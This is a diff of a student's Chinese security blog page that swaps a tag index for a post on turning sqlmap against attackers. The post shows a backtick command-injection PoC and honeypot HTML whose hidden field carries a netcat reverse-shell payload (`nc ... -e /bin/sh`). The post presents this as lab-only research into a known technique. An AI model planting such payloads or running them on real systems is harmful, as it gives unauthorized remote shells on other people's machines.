@@ -2,7 +2,7 @@
 <html>
 	<head>
 		
-<title>标签:网络安全-这里是一个普通学生的博客</title>
+<title>sqlmap基础反制-这里是一个普通学生的博客</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
@@ -11,8 +11,9 @@
 <link rel="stylesheet" href="/css/index.css">
 
 
-<meta name="keywords" content="hexo主题,hexo扁平化主题,Quiet主题">
-<meta name="description" content="描述">
+
+<meta name="keywords" content="网络安全,">
+<meta name="description" content="">
 
 
 <script src="/js/jquery.min.js"></script>
@@ -38,7 +39,6 @@
 
 	<body>
 		
-
 	<div class="header">
 		<div class="header-top" id="header-top">
 			<div class="h-left">
@@ -77,13 +77,13 @@
 								
 									
 						
-							<li class="select">
-								<a href="/tags">
-									TAGS
-								</a>
-								<span class="dot"></span>
-							</li>
-							
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
 									
 						
 								<li>
@@ -276,53 +276,149 @@
 
 </script>
 
-
-
-
-<div class="tag">
-    <div class="header-body-background">
-    <div class="header-body-background-content">
-        <span>
-            <img src="/image/logo.png" alt="Quiet">
-        </span>
-
-        <h2>文章标签：网络安全</h2>
-    </div>
-</div>
-    <div class="tag-content" id="content">
-        <div class="tag-content-data">
-            <div class="grouping">
-    
-        <p>
-            2023
-        </p>
+<div class="post">
+    <div class="post-header-background post-header-color"
+    style="background: url('')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/网络安全">网络安全</a></li>
+            
+            
+        </ul>
         
-        <a href="/2023/02/13/sqlmap基础反制/">
-            <span>sqlmap基础反制</span>
-            <time>02-13</time>
-        </a>
-        
-        <a href="/2023/02/11/ysoserial反制上线CS/">
-            <span>ysoserial反制上线CS</span>
-            <time>02-11</time>
-        </a>
-        
-        <a href="/2023/02/08/BurpSuite简单反制/">
-            <span>BurpSuite简单反制</span>
-            <time>02-08</time>
-        </a>
-        
-        <a href="/2023/02/08/2023-2-8/">
-            <span>一篇没什么意义的文章</span>
-            <time>02-08</time>
-        </a>
-        
-        
-</div>
+        <h1>sqlmap基础反制</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
+                        <g>
+                            <path fill="#12183A"
+                                d="M6.187 15.265A6.47 6.47 0 0 0 10 16.5a6.47 6.47 0 0 0 3.813-1.235A4.99 4.99 0 0 0 10 13.5a4.99 4.99 0 0 0-3.813 1.765zM5.082 14.25A6.485 6.485 0 0 1 10 12c1.965 0 3.726.872 4.918 2.25a6.5 6.5 0 1 0-9.836 0zM10 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0-1.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3z">
+                            </path>
+                        </g>
+                    </svg>
+                
+                <span class="post-header-info-author-text"> <a href="../../about">Nokali</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                </div>
+                <p>2023-02-13 21:57:25</p>
+            </div>
         </div>
     </div>
 </div>
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
+    
 
+    <h1 id="sqlmap伪RCE"><a href="#sqlmap伪RCE" class="headerlink" title="sqlmap伪RCE"></a>sqlmap伪RCE</h1><p>今天继续来探讨反制问题</p>
+<p>这次来讲讲sqlmap，虽然sqlmap的基础反制<strong>比较鸡肋</strong>，但是毕竟sqlmap的使用量太大了，所以还是值得拿出来讲一讲的</p>
+<p>由于这也是很久以前就完全公开的技术，这里我在网上找了一圈，找到了一篇帖子讲的比较浅显易懂，而且也提供了一个简单的POC，我把它贴在下面</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/118545378">https://blog.csdn.net/qq_44159028/article/details/118545378</a></p>
+<p><strong>在开始之前，按照惯例，仍然是强调一些注意事项，此处涉及的一切技术都是已公开的技术且仅限于本地测试，用于研究学习、讨论程序安全问题。不建议在实际环境中使用，且禁止用于非法用途。</strong></p>
+<p>进入正题：</p>
+<p>首先sqlmap是一款用于测试SQL注入的工具，主要有两种注入方式，GET和POST，而经典的原版sqlmap在使用时是在命令行模式下运行的，这就造成了安全隐患，而且这个安全隐患实际上<strong>并非sqlmap本身的漏洞，而是命令行工具都可能面对的问题。</strong><br><strong>因此才称之为：伪RCE</strong></p>
+<p>在Linux命令行中，有一些特殊符号能够形成额外的命令执行，它们也常被用于命令执行漏洞的利用和绕过，典型例子比如``（反引号）。</p>
+<p>有了以上线索，就可以很容易写出POC：</p>
+<pre><code>sqlmap -u &quot;http://xxx/x.php?id=1`ls`&quot;
+</code></pre>
+<p>实现简单的命令执行<br><img src="/2023/02/13/sqlmap%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%88%B6/1.png" alt="图片"></p>
+<p>而sqlmap通过<code>--data</code>来实现POST方式的注入，因此可以搭建一个蜜罐，在POST请求中插入反弹shell的代码，攻击者复制POST数据并使用<code>--data</code>模式来注入时就会直接上线。配合写入文件等手段可以实现持久化，从而实现有效反制。</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; A sqlmap honeypot demo&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+username:&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;
+&lt;form id=&quot;myForm&quot; action=&quot;username.php&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot;&gt;
+&lt;input type=&#39;hidden&#39; name=&#39;name&#39; value=&#39;admin&amp;password=123456&amp;key=something&amp;command=&quot;`nc 192.168.159.128 2333 -e /bin/sh`&quot;&#39;&gt;
+&lt;input type=&quot;submit&quot; οnclick=&quot;myForm.submit()&quot; value=&quot;Submit&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>在实验中使用的这个蜜罐是纯粹为验证目的，因此POST请求并不复杂，实际蜜罐可能会填充大量数据来掩盖payload。</p>
+<pre><code>sqlmap -u &quot;http://192.168.159.128/exp.html?id=1`ls`&quot; --data=&quot;name=admin&amp;password=123456&amp;key=something&amp;command=&quot;`nc 192.168.159.128 2333 -e /bin/sh`&quot;&quot;
+</code></pre>
+<p><strong>使用Burp抓取post数据，复制到<code>--data</code>进行post注入测试，即可直接反弹shell上线。</strong><br><img src="/2023/02/13/sqlmap%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%88%B6/2.png" alt="图片"></p>
+<p><img src="/2023/02/13/sqlmap%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%88%B6/3.png" alt="图片"><br>同样的，也可以通过后渗透模块注入meterpreter，或实现其他功能。</p>
+<p><strong>由此，通过简易的蜜罐来上线攻击者的PC，成功实现对攻击者的反制。</strong></p>
+
+  </div>
+  <div id=""></div>
+</div>
+
+<script>
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
+</script>
+
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
+    
+
+    
+    <a href="/2023/02/11/ysoserial%E5%8F%8D%E5%88%B6%E4%B8%8A%E7%BA%BFCS/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>ysoserial反制上线CS</p>
+        </div>
+    </a>
+    
+</div>
+</div>
 		
 <div class="footer">
 	<div class="Copyright">
